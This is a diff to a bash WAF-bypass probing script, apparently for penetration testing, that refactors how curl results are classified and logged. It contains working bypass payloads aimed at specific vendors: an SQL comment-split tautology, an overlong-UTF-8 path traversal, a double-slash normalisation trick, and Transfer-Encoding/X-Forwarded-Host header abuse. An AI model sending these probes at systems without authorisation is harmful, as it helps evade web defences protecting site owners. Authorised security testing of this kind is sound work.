@@ -169,7 +169,9 @@ _probe_one() {
   _sample_block_baseline "$target"
   local baseline_json="$OUT_DIR/.block_baseline.json"
   if [ -f "$_ANALYZER" ] && _have python3; then
-    python3 "$_ANALYZER" --calibrate "$target" --output "$baseline_json" --quiet 2>/dev/null || true
+    local _origin
+    _origin=$(printf '%s' "$target" | grep -oE 'https?://[^/]+')
+    python3 "$_ANALYZER" --calibrate "$_origin" --output "$baseline_json" --quiet 2>/dev/null || true
   fi
   log "probing $target"
   for combo in \
@@ -217,22 +219,23 @@ _probe_one() {
     local _tmpbody _tmphdr
     _tmpbody=$(mktemp)
     _tmphdr=$(mktemp)
-    local _args=( -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}" --max-time 5 -X "$method" )
+    local _args=( -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 5 -X "$method" )
     [ -n "$hdr" ] && _args+=( -H "$hdr" )
     local _result
-    _result=$(curl "${_args[@]}" "$url" 2>/dev/null || echo "0|0")
+    _result=$(curl "${_args[@]}" "$url" 2>/dev/null || echo "0|0|0")
     code="${_result%%|*}"
-    local _body_len="${_result##*|}"
+    local _body_len
+    _body_len=$(printf '%s' "$_result" | cut -d'|' -f2)
     local _verdict_json
     _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_result" "$baseline_json")
     local _verdict
-    _verdict=$(printf '%s' "$_verdict_json" | grep -o '"verdict":"[^"]*"' | cut -d'"' -f4)
+    _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
     local _log_ids
     _log_ids=$(_extract_log_ids "$_tmpbody")
     case "$_verdict" in
       bypassed)
         local _reason
-        _reason=$(printf '%s' "$_verdict_json" | grep -o '"reason":"[^"]*"' | cut -d'"' -f4)
+        _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
         hit "$method  $url  $hdr  → HTTP $code (${_body_len}B) [${_reason}]"
         [ -n "$_log_ids" ] && log "  WAF Log IDs: $_log_ids"
         echo "$method|$url|$hdr|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_hits.txt"
@@ -252,53 +255,112 @@ _probe_one() {
   case "$waf" in
     cloudflare)
       log "cloudflare: trying TE+X-Forwarded-Host..."
-      local _cf_tmp; _cf_tmp=$(mktemp)
-      local _cf_hdr; _cf_hdr=$(mktemp)
-      local _cf_res
-      _cf_res=$(curl -sk -D "$_cf_hdr" -o "$_cf_tmp" -w "%{http_code}|%{size_download}" --max-time 6 \
+      local _tmpbody; _tmpbody=$(mktemp)
+      local _tmphdr; _tmphdr=$(mktemp)
+      local _res
+      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         -H "Transfer-Encoding: chunked" -H "X-Forwarded-Host: localhost" \
-        "$target" 2>/dev/null || echo "0|0")
-      code="${_cf_res%%|*}"; local _cf_len="${_cf_res##*|}"
-      if _is_real_bypass "$_cf_tmp" "$code" "$_cf_len"; then
-        hit "cloudflare TE+XFH → $code (${_cf_len}B)"; echo "CF-TE+XFH|$target||$code|$_cf_len" >> "$OUT_DIR/bypass_hits.txt"; found=1
-      fi
-      rm -f "$_cf_tmp" "$_cf_hdr"
+        "$target" 2>/dev/null || echo "0|0|0")
+      code="${_res%%|*}"
+      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
+      local _verdict_json
+      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
+      local _verdict
+      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      local _reason
+      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      case "$_verdict" in
+        bypassed)
+          hit "cloudflare TE+XFH → $code (${_body_len}B) [${_reason}]"
+          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
+        needs_review)
+          echo -e "${YELLOW}[?]${NC} cloudflare TE+XFH → $code (${_body_len}B) — uncertain"
+          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_uncertain.txt" ;;
+        blocked)
+          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_blocked.txt" ;;
+      esac
+      rm -f "$_tmpbody" "$_tmphdr"
       ;;
     aws)
       log "aws: trying comment-splitting on param..."
-      local _aws_tmp; _aws_tmp=$(mktemp)
-      local _aws_res
-      _aws_res=$(curl -sk -o "$_aws_tmp" -w "%{http_code}|%{size_download}" --max-time 6 \
-        "${target}?id=1/**/AND/**/1=1" 2>/dev/null || echo "0|0")
-      code="${_aws_res%%|*}"; local _aws_len="${_aws_res##*|}"
-      if _is_real_bypass "$_aws_tmp" "$code" "$_aws_len"; then
-        hit "aws comment-split → $code (${_aws_len}B)"; echo "AWS-comment|$target||$code|$_aws_len" >> "$OUT_DIR/bypass_hits.txt"; found=1
-      fi
-      rm -f "$_aws_tmp"
+      local _tmpbody; _tmpbody=$(mktemp)
+      local _tmphdr; _tmphdr=$(mktemp)
+      local _res
+      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+        "${target}?id=1/**/AND/**/1=1" 2>/dev/null || echo "0|0|0")
+      code="${_res%%|*}"
+      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
+      local _verdict_json
+      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
+      local _verdict
+      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      local _reason
+      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      case "$_verdict" in
+        bypassed)
+          hit "aws comment-split → $code (${_body_len}B) [${_reason}]"
+          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
+        needs_review)
+          echo -e "${YELLOW}[?]${NC} aws comment-split → $code (${_body_len}B) — uncertain"
+          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_uncertain.txt" ;;
+        blocked)
+          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_blocked.txt" ;;
+      esac
+      rm -f "$_tmpbody" "$_tmphdr"
       ;;
     imperva)
       log "imperva: trying unicode overlong..."
-      local _imp_tmp; _imp_tmp=$(mktemp)
-      local _imp_res
-      _imp_res=$(curl -sk -o "$_imp_tmp" -w "%{http_code}|%{size_download}" --max-time 6 \
-        "${base}/%c0%2e%c0%2e/${last}" 2>/dev/null || echo "0|0")
-      code="${_imp_res%%|*}"; local _imp_len="${_imp_res##*|}"
-      if _is_real_bypass "$_imp_tmp" "$code" "$_imp_len"; then
-        hit "imperva unicode overlong → $code (${_imp_len}B)"; echo "IMPERVA-unicode|$target||$code|$_imp_len" >> "$OUT_DIR/bypass_hits.txt"; found=1
-      fi
-      rm -f "$_imp_tmp"
+      local _tmpbody; _tmpbody=$(mktemp)
+      local _tmphdr; _tmphdr=$(mktemp)
+      local _res
+      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+        "${base}/%c0%2e%c0%2e/${last}" 2>/dev/null || echo "0|0|0")
+      code="${_res%%|*}"
+      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
+      local _verdict_json
+      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
+      local _verdict
+      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      local _reason
+      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      case "$_verdict" in
+        bypassed)
+          hit "imperva unicode overlong → $code (${_body_len}B) [${_reason}]"
+          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
+        needs_review)
+          echo -e "${YELLOW}[?]${NC} imperva unicode overlong → $code (${_body_len}B) — uncertain"
+          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_uncertain.txt" ;;
+        blocked)
+          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_blocked.txt" ;;
+      esac
+      rm -f "$_tmpbody" "$_tmphdr"
       ;;
     f5-bigip)
       log "f5: trying path normalisation bypass..."
-      local _f5_tmp; _f5_tmp=$(mktemp)
-      local _f5_res
-      _f5_res=$(curl -sk -o "$_f5_tmp" -w "%{http_code}|%{size_download}" --max-time 6 \
-        "${base}/%2f%2f${last}" 2>/dev/null || echo "0|0")
-      code="${_f5_res%%|*}"; local _f5_len="${_f5_res##*|}"
-      if _is_real_bypass "$_f5_tmp" "$code" "$_f5_len"; then
-        hit "f5-bigip double-slash → $code (${_f5_len}B)"; echo "F5-doubleslash|$target||$code|$_f5_len" >> "$OUT_DIR/bypass_hits.txt"; found=1
-      fi
-      rm -f "$_f5_tmp"
+      local _tmpbody; _tmpbody=$(mktemp)
+      local _tmphdr; _tmphdr=$(mktemp)
+      local _res
+      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+        "${base}/%2f%2f${last}" 2>/dev/null || echo "0|0|0")
+      code="${_res%%|*}"
+      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
+      local _verdict_json
+      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
+      local _verdict
+      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      local _reason
+      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
+      case "$_verdict" in
+        bypassed)
+          hit "f5-bigip double-slash → $code (${_body_len}B) [${_reason}]"
+          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
+        needs_review)
+          echo -e "${YELLOW}[?]${NC} f5-bigip double-slash → $code (${_body_len}B) — uncertain"
+          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_uncertain.txt" ;;
+        blocked)
+          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$_verdict_json" >> "$OUT_DIR/bypass_blocked.txt" ;;
+      esac
+      rm -f "$_tmpbody" "$_tmphdr"
       ;;
   esac
   [ "$found" = "0" ] && ok "no bypass on $target"
@@ -316,4 +378,5 @@ fi
 log "Output written to: $OUT_DIR"
 [ -f "$OUT_DIR/bypass_hits.txt" ]     && ok  "bypass_hits.txt:     $(wc -l < "$OUT_DIR/bypass_hits.txt") confirmed bypass(es)"
 [ -f "$OUT_DIR/bypass_uncertain.txt" ] && log "bypass_uncertain.txt: $(wc -l < "$OUT_DIR/bypass_uncertain.txt") needs review (200 body may still be block page)"
+[ -f "$OUT_DIR/bypass_blocked.txt" ]  && log "Confirmed blocked: $(wc -l < "$OUT_DIR/bypass_blocked.txt") probe(s) → $OUT_DIR/bypass_blocked.txt"
 [ -f "$OUT_DIR/waf_fingerprint.txt" ] && log "waf_fingerprint.txt:  $(cat "$OUT_DIR/waf_fingerprint.txt")"
